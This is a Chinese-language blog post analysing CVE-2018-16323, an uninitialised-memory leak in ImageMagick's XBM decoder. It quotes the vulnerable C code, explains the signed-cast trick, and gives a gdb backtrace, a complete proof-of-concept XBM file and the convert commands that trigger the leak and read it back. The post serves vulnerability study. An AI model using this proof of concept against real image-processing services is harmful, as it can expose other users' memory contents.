---
layout: post
title: "CVE-2018-16323"
description: "CVE"
category: 学习技术
tags: [cve分析]
---
{% include JB/setup %}

#CVE-2018-16323


##1.资料链接：

[Image Magick API]: (https://imagemagick.org/api/magick.php)

[ImageMagick内存泄漏漏洞分析（CVE-2018-16323)]: (https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247490253&idx=4&sn=c5151e57e40cb39a43a5e088ff0f3ee1&chksm=e916caf7de6143e1182f5695c8ed5c6693753369c247ad7e69f1a9369468500220c705e003d9&scene=0&xtrack=1)
[C 语言中的指针和内存泄漏]: (https://www.ibm.com/developerworks/cn/aix/library/au-toughgame/index.html)
[poc]: (https://github.com/ttffdd/XBadManners)
[软件版本]: (https://dl.bintray.com/homebrew/mirror/imagemagick%406-6.9.9-51.tar.xz)

##2.软件简介：
ImageMagick是用于创建、编辑、转换位图图像的软件，它可以读取和写入超过200种格式的图像，包括PNG、JPEG、GIF、HEIC、TIFF、DPX、EXR、WebP、Postscript、PDF和SVG。使用ImageMagick还可以对图像进行调整大小、翻转、镜像、旋转、扭曲、剪裁和变换，可以调整图像颜色、应用各种特殊效果，可以绘制文本、线条、多边形、椭圆和Bézier曲线。</br>
此漏洞存在xbm.c源码中：精心构造small_poc.xbm，可以产生内存泄漏。</br>
涉及知识点：对内存分配后，没有初始化，那就可以获得该内存之前存放的内容，使得存在内存泄漏问题。</br>

##3.漏洞点代码：

```c

static Image *ReadXBMImage(const ImageInfo *image_info,ExceptionInfo *exception)
{
  char
    buffer[MaxTextExtent],
    name[MaxTextExtent];

  Image
    *image;

  int
    c;

  MagickBooleanType
    status;

  register IndexPacket
    *indexes;

  register ssize_t
    i,
    x;

  register PixelPacket
    *q;

  register unsigned char
    *p;

  short int
    hex_digits[256];

  ssize_t
    y;

  unsigned char
    *data;

  unsigned int
    bit,
    byte,
    bytes_per_line,
    height,
    length,
    padding,
    version,
    width;

  /*
    Open image file.
    Read X bitmap header.
    Scan until hex digits.
    Initialize colormap.
    Initialize hex values.
    Read hex image data.
  */
  ...
 
 
  padding=0;
  if (((image->columns % 16) != 0) && ((image->columns % 16) < 9) &&
      (version == 10))
    padding=1;
  bytes_per_line=(unsigned int) (image->columns+7)/8+padding;
  length=(unsigned int) image->rows;
  data=(unsigned char *) AcquireQuantumMemory(length,bytes_per_line*
    sizeof(*data));//分配内存，返回一个指向至少（计数*量子）个字节的内存块的指针，该字节适当对齐以适合任何用途。
  if (data == (unsigned char *) NULL)
    ThrowReaderException(ResourceLimitError,"MemoryAllocationFailed");
  p=data;
  if (version == 10)
    for (i=0; i < (ssize_t) (bytes_per_line*image->rows); (i+=2))
    {
      c=XBMInteger(image,hex_digits);
      if (c < 0)//漏洞点，如果控制c<0,那分配的内存就未初始化，会产生内存泄漏
        break;//跳出循环，这样就没有初始化内存
      *p++=(unsigned char) c;
      if ((padding == 0) || (((i+2) % bytes_per_line) != 0))
        *p++=(unsigned char) (c >> 8);
    }
  else
    for (i=0; i < (ssize_t) (bytes_per_line*image->rows); i++)
    {
      c=XBMInteger(image,hex_digits);
      if (c < 0)//同上
        break;//这样的话c就不会给*p
      *p++=(unsigned char) c;
    }
  if (EOFBlob(image) != MagickFalse)
    {
      data=(unsigned char *) RelinquishMagickMemory(data);
      ThrowReaderException(ResourceLimitError,"MemoryAllocationFailed");
    }
  /*
    Convert X bitmap image to pixel packets.
  */
  ...
}

```
想要触发就要使得XBMInteger返回的值为负数</br>
```c
hex_digits[(int) '0']=0;
  hex_digits[(int) '1']=1;
  hex_digits[(int) '2']=2;
  hex_digits[(int) '3']=3;
  hex_digits[(int) '4']=4;
  hex_digits[(int) '5']=5;
  hex_digits[(int) '6']=6;
  hex_digits[(int) '7']=7;
  hex_digits[(int) '8']=8;
  hex_digits[(int) '9']=9;
  hex_digits[(int) 'A']=10;
  hex_digits[(int) 'B']=11;
  hex_digits[(int) 'C']=12;
  hex_digits[(int) 'D']=13;
  hex_digits[(int) 'E']=14;
  hex_digits[(int) 'F']=15;
  hex_digits[(int) 'a']=10;
  hex_digits[(int) 'b']=11;
  hex_digits[(int) 'c']=12;
  hex_digits[(int) 'd']=13;
  hex_digits[(int) 'e']=14;
  hex_digits[(int) 'f']=15;
  hex_digits[(int) 'x']=0;
  hex_digits[(int) ' ']=(-1);
  hex_digits[(int) ',']=(-1);
  hex_digits[(int) '}']=(-1);
  hex_digits[(int) '\n']=(-1);
  hex_digits[(int) '\t']=(-1);//可以理解为将字符装换成数字
static int XBMInteger(Image *image,short int *hex_digits)//指针图像和指针hex_digits作为参数。hex_digits是个初始化数组
{
  int
    c;

  unsigned int
    value;

  /*
    Skip any leading whitespace.
    跳过空白的部分
  */
  do
  {
    c=ReadBlobByte(image);
    if (c == EOF)
      return(-1);
  } while ((c == ' ') || (c == '\t') || (c == '\n') || (c == '\r'));//遇到空格啥，这里并没有设定这个数的长度
  /*
    Evaluate number.
  */
  value=0;
  while (hex_digits[c] >= 0) {
    if (value > (unsigned int) (INT_MAX/10))
      break;
    value*=16;//每次遍历都*16，第一次变成0X80,后面是0X800，，，
    c&=0xff;
    if (value > (unsigned int) (INT_MAX-hex_digits[c]))
      break;
    value+=hex_digits[c];//前面读取的是一个个读取的，现在向数字还原，控制这个值足够大，这里最后value=0x8000001，此时value为无符号的值
    c=ReadBlobByte(image);
    if (c == EOF)
      return(-1);
  }
  return((int) value);//返回的时候装换成了有符号的int类型，前面将十六进制无符号数足够大，后边转成有符号数那会产生负数
}

```

##4.漏洞分析：</br>

1.触发命令：convert poc.xbm poc.png</br>
2.参数：small_poc.xbm</br>
xmb是一种古老但通用的图像文件格式，它与许多Web浏览器都兼容。X-Windows图形界面（UNIX和Linux常用的GUI）的C代码库xlib中有一个组件专门描述了它的规范。XBM图形的实质上是使用16进制数组来表示二进制图像的C源代码文件。</br>
small_poc.xbm的格式如下:</br>
```c
#define small_poc_width 64
#define small_poc_height 64
static char small_poc_bits[] = {
  0x80000001, XXX};

```

函数调用栈</br>
```c
gdb-peda$ bt
#0  XBMInteger (image=image@entry=0x632410, hex_digits=hex_digits@entry=0x7fffffff2c90) at coders/xbm.c:135
#1  0x00007ffff7a14232 in ReadXBMImage (image_info=0x6229b0, exception=0x616090) at coders/xbm.c:367
#2  0x00007ffff77df88a in ReadImage (image_info=image_info@entry=0x61e690, exception=exception@entry=0x616090) at magick/constitute.c:551
#3  0x00007ffff77e095b in ReadImages (image_info=image_info@entry=0x61a3b0, exception=exception@entry=0x616090) at magick/constitute.c:870
#4  0x00007ffff743fbc4 in ConvertImageCommand (image_info=0x61a3b0, argc=0x3, argv=0x61e550, metadata=0x0, exception=0x616090) at wand/convert.c:633
#5  0x00007ffff74ae2e7 in MagickCommandGenesis (image_info=image_info@entry=0x616210, command=0x4007b0 <ConvertImageCommand@plt>, argc=argc@entry=0x3, 
    argv=argv@entry=0x7fffffffdb48, metadata=metadata@entry=0x0, exception=exception@entry=0x616090) at wand/mogrify.c:172
#6  0x0000000000400877 in ConvertMain (argv=0x7fffffffdb48, argc=0x3) at utilities/convert.c:81
#7  main (argc=argc@entry=0x3, argv=argv@entry=0x7fffffffdb48) at utilities/convert.c:92
#8  0x00007ffff6e33830 in __libc_start_main (main=0x400830 <main>, argc=0x3, argv=0x7fffffffdb48, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdb38) at ../csu/libc-start.c:291
#9  0x00000000004008d9 in _start ()

```
如何获取内存泄漏的信息呢？
convert poc.png temp.xbm 这样的话查看temp.xmb 就是泄露非的内容

small_poc.xmb的相关内容</br>
```c
#define small_poc_width 64
#define small_poc_height 64
static char small_poc_bits[] = {
  0x80000001, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, };
  ```

##5.流程演示：</br>

    ![](/assets/img/cve/cve-2018-16323.png)

##6总结：

该漏洞主要是程序在执行过程中存在未初始化内存的相关路径，从而可能导致内存泄漏问题.

 

